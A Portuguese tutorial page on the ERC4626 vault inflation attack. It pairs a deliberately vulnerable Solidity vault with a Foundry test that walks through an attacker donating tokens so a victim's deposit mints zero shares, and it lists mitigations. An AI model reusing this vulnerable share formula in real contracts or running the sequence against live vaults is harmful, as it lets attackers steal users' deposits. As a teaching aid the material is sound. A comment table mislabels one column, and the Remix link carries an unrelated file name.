# Inflação do cofre

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

As ações do cofre podem ser infladas doando tokens ERC20 para o cofre.

O invasor pode explorar esse comportamento para roubar os depósitos de outros usuários.

</h4><a href="#example" id="example">Exemplo</a></h4>
O usuário 0 executa o depósito do usuário 1.

1. O usuário 0 deposita 1.
2. O usuário 0 doa `100 * 1e18`. Isso aumenta o valor de cada ação.
3. O usuário 1 deposita `100 * 1e18`. Isso gera 0 ações para o usuário 1.
4. O usuário 0 retira todos os `200 * 1e18 + 1`.

</h4><a href="#protections" id="protections">Proteções</a></h4>

* Mínimo de ações -> protege contra a corrida pela frente
* Saldo interno -> protege contra doações
* Ações mortas -> o contrato é o primeiro depositante
* Compensação decimal (OpenZeppelin ERC4626)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";

uint8 constant DECIMALS = 18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Token is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals = DECIMALS;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(address dst, uint256 amount) external {
        balanceOf[dst] += amount;
        totalSupply += amount;
        emit Transfer(address(0), dst, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}

contract Vault {
    IERC20 public immutable token;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function _mint(address _to, uint256 _shares) private {
        totalSupply += _shares;
        balanceOf[_to] += _shares;
    }

    function _burn(address _from, uint256 _shares) private {
        totalSupply -= _shares;
        balanceOf[_from] -= _shares;
    }

    // Ataque de inflação //
    // 1. usuário 0 deposita 1
    // 2. usuário 0 doa 100 * 1e18
    // 3. usuário 1 deposita 100 * 1e18 -> 0 ações mintada
    // 4. O usuário 0 retira 200 * 1e18 + 1
    //
    // ações do usuário 1 = 100 * 1e18 * 1 / (100 * 1e18 + 1)
    //               = 0
    //
    //    | saldo          | ações do usuário 0 | ações do usuário 0 | fornecimento total |
    // 1. |              1 |             1      |             0      |            1       |
    // 2. | 100 * 1e18 + 1 |             1      |             0      |            1       |
    // 3. | 200 * 1e18 + 1 |             1      |             0      |            1       |
    // 4. |              0 |             0      |             0      |            0       |

    function deposit(uint256 amount) external {
        uint256 shares;
        if (totalSupply == 0) {
            shares = amount;
        } else {
            shares = (amount * totalSupply) / token.balanceOf(address(this));
        }

        _mint(msg.sender, shares);
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 shares) external returns (uint256) {
        uint256 amount = (shares * token.balanceOf(address(this))) / totalSupply;
        _burn(msg.sender, shares);
        token.transfer(msg.sender, amount);
        return amount;
    }

    function previewRedeem(uint256 shares) external returns (uint256) {
        if (totalSupply == 0) {
            return 0;
        }
        return (shares * token.balanceOf(address(this))) / totalSupply;
    }
}

// forge test -vvv --match-path Vault.test.sol
contract VaultTest is Test {
    Vault private vault;
    Token private token;

    address[] private users = [address(11), address(12)];

    function setUp() public {
        token = new Token();
        vault = new Vault(address(token));

        for (uint256 i = 0; i < users.length; i++) {
            token.mint(users[i], 10000 * (10 ** DECIMALS));
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function print() private {
        console2.log("vault total supply", vault.totalSupply());
        console2.log("vault balance", token.balanceOf(address(vault)));
        uint256 shares0 = vault.balanceOf(users[0]);
        uint256 shares1 = vault.balanceOf(users[1]);
        console2.log("users[0] shares", shares0);
        console2.log("users[1] shares", shares1);
        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
    }

    function test() public {
        // users[0] depósita 1
        console2.log("--- users[0] deposit ---");
        vm.prank(users[0]);
        vault.deposit(1);
        print();

        // users[0] doa 100
        console2.log("--- users[0] donate ---");
        vm.prank(users[0]);
        token.transfer(address(vault), 100 * (10 ** DECIMALS));
        print();

        // users[1] deposita 100
        console2.log("--- users[1] deposit ---");
        vm.prank(users[1]);
        vault.deposit(100 * (10 ** DECIMALS));
        print();
    }
}
```

## Teste no Remix

* [BlockTimestamp.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIwOwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKCnVpbnQ4IGNvbnN0YW50IERFQ0lNQUxTID0gMTg7CgppbnRlcmZhY2UgSUVSQzIwIHsKICAgIGZ1bmN0aW9uIHRvdGFsU3VwcGx5KCkgZXh0ZXJuYWwgdmlldyByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGJhbGFuY2VPZihhZGRyZXNzIGFjY291bnQpIGV4dGVybmFsIHZpZXcgcmV0dXJucyAodWludDI1Nik7CiAgICBmdW5jdGlvbiB0cmFuc2ZlcihhZGRyZXNzIHJlY2lwaWVudCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwogICAgZnVuY3Rpb24gYWxsb3dhbmNlKGFkZHJlc3Mgb3duZXIsIGFkZHJlc3Mgc3BlbmRlcikgZXh0ZXJuYWwgdmlldyByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyBzcGVuZGVyLCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBzZW5kZXIsIGFkZHJlc3MgcmVjaXBpZW50LCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CgogICAgZXZlbnQgVHJhbnNmZXIoYWRkcmVzcyBpbmRleGVkIGZyb20sIGFkZHJlc3MgaW5kZXhlZCB0bywgdWludDI1NiB2YWx1ZSk7CiAgICBldmVudCBBcHByb3ZhbChhZGRyZXNzIGluZGV4ZWQgb3duZXIsIGFkZHJlc3MgaW5kZXhlZCBzcGVuZGVyLCB1aW50MjU2IHZhbHVlKTsKfQoKY29udHJhY3QgVG9rZW4gaXMgSUVSQzIwIHsKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpKSBwdWJsaWMgYWxsb3dhbmNlOwogICAgdWludDggcHVibGljIGRlY2ltYWxzID0gREVDSU1BTFM7CgogICAgZnVuY3Rpb24gdHJhbnNmZXIoYWRkcmVzcyByZWNpcGllbnQsIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCByZXR1cm5zIChib29sKSB7CiAgICAgICAgYmFsYW5jZU9mW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICBiYWxhbmNlT2ZbcmVjaXBpZW50XSArPSBhbW91bnQ7CiAgICAgICAgZW1pdCBUcmFuc2Zlcihtc2cuc2VuZGVyLCByZWNpcGllbnQsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gYXBwcm92ZShhZGRyZXNzIHNwZW5kZXIsIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCByZXR1cm5zIChib29sKSB7CiAgICAgICAgYWxsb3dhbmNlW21zZy5zZW5kZXJdW3NwZW5kZXJdID0gYW1vdW50OwogICAgICAgIGVtaXQgQXBwcm92YWwobXNnLnNlbmRlciwgc3BlbmRlciwgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBzZW5kZXIsIGFkZHJlc3MgcmVjaXBpZW50LCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGFsbG93YW5jZVtzZW5kZXJdW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICBiYWxhbmNlT2Zbc2VuZGVyXSAtPSBhbW91bnQ7CiAgICAgICAgYmFsYW5jZU9mW3JlY2lwaWVudF0gKz0gYW1vdW50OwogICAgICAgIGVtaXQgVHJhbnNmZXIoc2VuZGVyLCByZWNpcGllbnQsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gbWludChhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHsKICAgICAgICBiYWxhbmNlT2ZbZHN0XSArPSBhbW91bnQ7CiAgICAgICAgdG90YWxTdXBwbHkgKz0gYW1vdW50OwogICAgICAgIGVtaXQgVHJhbnNmZXIoYWRkcmVzcygwKSwgZHN0LCBhbW91bnQpOwogICAgfQoKICAgIGZ1bmN0aW9uIGJ1cm4odWludDI1NiBhbW91bnQpIGV4dGVybmFsIHsKICAgICAgICBiYWxhbmNlT2ZbbXNnLnNlbmRlcl0gLT0gYW1vdW50OwogICAgICAgIHRvdGFsU3VwcGx5IC09IGFtb3VudDsKICAgICAgICBlbWl0IFRyYW5zZmVyKG1zZy5zZW5kZXIsIGFkZHJlc3MoMCksIGFtb3VudCk7CiAgICB9Cn0KCmNvbnRyYWN0IFZhdWx0IHsKICAgIElFUkMyMCBwdWJsaWMgaW1tdXRhYmxlIHRva2VuOwoKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfdG9rZW4pIHsKICAgICAgICB0b2tlbiA9IElFUkMyMChfdG9rZW4pOwogICAgfQoKICAgIGZ1bmN0aW9uIF9taW50KGFkZHJlc3MgX3RvLCB1aW50MjU2IF9zaGFyZXMpIHByaXZhdGUgewogICAgICAgIHRvdGFsU3VwcGx5ICs9IF9zaGFyZXM7CiAgICAgICAgYmFsYW5jZU9mW190b10gKz0gX3NoYXJlczsKICAgIH0KCiAgICBmdW5jdGlvbiBfYnVybihhZGRyZXNzIF9mcm9tLCB1aW50MjU2IF9zaGFyZXMpIHByaXZhdGUgewogICAgICAgIHRvdGFsU3VwcGx5IC09IF9zaGFyZXM7CiAgICAgICAgYmFsYW5jZU9mW19mcm9tXSAtPSBfc2hhcmVzOwogICAgfQoKICAgIC8vIEF0YXF1ZSBkZSBpbmZsYWNhbyAvLwogICAgLy8gMS4gdXN1YXJpbyAwIGRlcG9zaXRhIDEKICAgIC8vIDIuIHVzdWFyaW8gMCBkb2EgMTAwICogMWUxOAogICAgLy8gMy4gdXN1YXJpbyAxIGRlcG9zaXRhIDEwMCAqIDFlMTggLT4gMCBhY29lcyBtaW50YWRhCiAgICAvLyA0LiBPIHVzdWFyaW8gMCByZXRpcmEgMjAwICogMWUxOCArIDEKICAgIC8vCiAgICAvLyBhY29lcyBkbyB1c3VhcmlvIDEgPSAxMDAgKiAxZTE4ICogMSAvICgxMDAgKiAxZTE4ICsgMSkKICAgIC8vICAgICAgICAgICAgICAgPSAwCiAgICAvLwogICAgLy8gICAgfCBzYWxkbyAgICAgICAgICB8IGFjb2VzIGRvIHVzdWFyaW8gMCB8IGFjb2VzIGRvIHVzdWFyaW8gMCB8IGZvcm5lY2ltZW50byB0b3RhbCB8CiAgICAvLyAxLiB8ICAgICAgICAgICAgICAxIHwgICAgICAgICAgICAgMSAgICAgIHwgICAgICAgICAgICAgMCAgICAgIHwgICAgICAgICAgICAxICAgICAgIHwKICAgIC8vIDIuIHwgMTAwICogMWUxOCArIDEgfCAgICAgICAgICAgICAxICAgICAgfCAgICAgICAgICAgICAwICAgICAgfCAgICAgICAgICAgIDEgICAgICAgfAogICAgLy8gMy4gfCAyMDAgKiAxZTE4ICsgMSB8ICAgICAgICAgICAgIDEgICAgICB8ICAgICAgICAgICAgIDAgICAgICB8ICAgICAgICAgICAgMSAgICAgICB8CiAgICAvLyA0LiB8ICAgICAgICAgICAgICAwIHwgICAgICAgICAgICAgMCAgICAgIHwgICAgICAgICAgICAgMCAgICAgIHwgICAgICAgICAgICAwICAgICAgIHwKCiAgICBmdW5jdGlvbiBkZXBvc2l0KHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgdWludDI1NiBzaGFyZXM7CiAgICAgICAgaWYgKHRvdGFsU3VwcGx5ID09IDApIHsKICAgICAgICAgICAgc2hhcmVzID0gYW1vdW50OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHNoYXJlcyA9IChhbW91bnQgKiB0b3RhbFN1cHBseSkgLyB0b2tlbi5iYWxhbmNlT2YoYWRkcmVzcyh0aGlzKSk7CiAgICAgICAgfQoKICAgICAgICBfbWludChtc2cuc2VuZGVyLCBzaGFyZXMpOwogICAgICAgIHRva2VuLnRyYW5zZmVyRnJvbShtc2cuc2VuZGVyLCBhZGRyZXNzKHRoaXMpLCBhbW91bnQpOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgc2hhcmVzKSBleHRlcm5hbCByZXR1cm5zICh1aW50MjU2KSB7CiAgICAgICAgdWludDI1NiBhbW91bnQgPSAoc2hhcmVzICogdG9rZW4uYmFsYW5jZU9mKGFkZHJlc3ModGhpcykpKSAvIHRvdGFsU3VwcGx5OwogICAgICAgIF9idXJuKG1zZy5zZW5kZXIsIHNoYXJlcyk7CiAgICAgICAgdG9rZW4udHJhbnNmZXIobXNnLnNlbmRlciwgYW1vdW50KTsKICAgICAgICByZXR1cm4gYW1vdW50OwogICAgfQoKICAgIGZ1bmN0aW9uIHByZXZpZXdSZWRlZW0odWludDI1NiBzaGFyZXMpIGV4dGVybmFsIHJldHVybnMgKHVpbnQyNTYpIHsKICAgICAgICBpZiAodG90YWxTdXBwbHkgPT0gMCkgewogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIChzaGFyZXMgKiB0b2tlbi5iYWxhbmNlT2YoYWRkcmVzcyh0aGlzKSkpIC8gdG90YWxTdXBwbHk7CiAgICB9Cn0KCi8vIGZvcmdlIHRlc3QgLXZ2diAtLW1hdGNoLXBhdGggVmF1bHQudGVzdC5zb2wKY29udHJhY3QgVmF1bHRUZXN0IGlzIFRlc3QgewogICAgVmF1bHQgcHJpdmF0ZSB2YXVsdDsKICAgIFRva2VuIHByaXZhdGUgdG9rZW47CgogICAgYWRkcmVzc1tdIHByaXZhdGUgdXNlcnMgPSBbYWRkcmVzcygxMSksIGFkZHJlc3MoMTIpXTsKCiAgICBmdW5jdGlvbiBzZXRVcCgpIHB1YmxpYyB7CiAgICAgICAgdG9rZW4gPSBuZXcgVG9rZW4oKTsKICAgICAgICB2YXVsdCA9IG5ldyBWYXVsdChhZGRyZXNzKHRva2VuKSk7CgogICAgICAgIGZvciAodWludDI1NiBpID0gMDsgaSA8IHVzZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIHRva2VuLm1pbnQodXNlcnNbaV0sIDEwMDAwICogKDEwICoqIERFQ0lNQUxTKSk7CiAgICAgICAgICAgIHZtLnByYW5rKHVzZXJzW2ldKTsKICAgICAgICAgICAgdG9rZW4uYXBwcm92ZShhZGRyZXNzKHZhdWx0KSwgdHlwZSh1aW50MjU2KS5tYXgpOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBwcmludCgpIHByaXZhdGUgewogICAgICAgIGNvbnNvbGUyLmxvZygidmF1bHQgdG90YWwgc3VwcGx5IiwgdmF1bHQudG90YWxTdXBwbHkoKSk7CiAgICAgICAgY29uc29sZTIubG9nKCJ2YXVsdCBiYWxhbmNlIiwgdG9rZW4uYmFsYW5jZU9mKGFkZHJlc3ModmF1bHQpKSk7CiAgICAgICAgdWludDI1NiBzaGFyZXMwID0gdmF1bHQuYmFsYW5jZU9mKHVzZXJzWzBdKTsKICAgICAgICB1aW50MjU2IHNoYXJlczEgPSB2YXVsdC5iYWxhbmNlT2YodXNlcnNbMV0pOwogICAgICAgIGNvbnNvbGUyLmxvZygidXNlcnNbMF0gc2hhcmVzIiwgc2hhcmVzMCk7CiAgICAgICAgY29uc29sZTIubG9nKCJ1c2Vyc1sxXSBzaGFyZXMiLCBzaGFyZXMxKTsKICAgICAgICBjb25zb2xlMi5sb2coInVzZXJzWzBdIHJlZGVlbWFibGUiLCB2YXVsdC5wcmV2aWV3UmVkZWVtKHNoYXJlczApKTsKICAgICAgICBjb25zb2xlMi5sb2coInVzZXJzWzFdIHJlZGVlbWFibGUiLCB2YXVsdC5wcmV2aWV3UmVkZWVtKHNoYXJlczEpKTsKICAgIH0KCiAgICBmdW5jdGlvbiB0ZXN0KCkgcHVibGljIHsKICAgICAgICAvLyB1c2Vyc1swXSBkZXBvc2l0YSAxCiAgICAgICAgY29uc29sZTIubG9nKCItLS0gdXNlcnNbMF0gZGVwb3NpdCAtLS0iKTsKICAgICAgICB2bS5wcmFuayh1c2Vyc1swXSk7CiAgICAgICAgdmF1bHQuZGVwb3NpdCgxKTsKICAgICAgICBwcmludCgpOwoKICAgICAgICAvLyB1c2Vyc1swXSBkb2EgMTAwCiAgICAgICAgY29uc29sZTIubG9nKCItLS0gdXNlcnNbMF0gZG9uYXRlIC0tLSIpOwogICAgICAgIHZtLnByYW5rKHVzZXJzWzBdKTsKICAgICAgICB0b2tlbi50cmFuc2ZlcihhZGRyZXNzKHZhdWx0KSwgMTAwICogKDEwICoqIERFQ0lNQUxTKSk7CiAgICAgICAgcHJpbnQoKTsKCiAgICAgICAgLy8gdXNlcnNbMV0gZGVwb3NpdGEgMTAwCiAgICAgICAgY29uc29sZTIubG9nKCItLS0gdXNlcnNbMV0gZGVwb3NpdCAtLS0iKTsKICAgICAgICB2bS5wcmFuayh1c2Vyc1sxXSk7CiAgICAgICAgdmF1bHQuZGVwb3NpdCgxMDAgKiAoMTAgKiogREVDSU1BTFMpKTsKICAgICAgICBwcmludCgpOwogICAgfQp9&version=soljson-v0.8.20+commit.a1b79de6.js)
